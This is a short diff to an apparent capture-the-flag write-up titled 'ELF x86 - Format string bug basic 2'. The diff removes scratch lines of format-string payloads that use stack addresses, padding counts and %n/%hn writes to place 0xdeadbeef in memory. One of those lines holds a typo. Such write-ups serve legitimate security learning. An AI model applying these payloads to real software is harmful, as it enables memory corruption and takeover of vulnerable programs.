@@ -1,12 +1,3 @@
-0xffffc818 + (3735928559 - 4 )x + %9$n 
-
-0xffffc7d8 +  0xffffc7da  + (48879 - 8)x + $9%hn + (57005 - 48879)x + %10$hn
-
-
-
-
-
-
 # ELF x86 - Format string bug basic 2
 
 ## Vulnerability summary
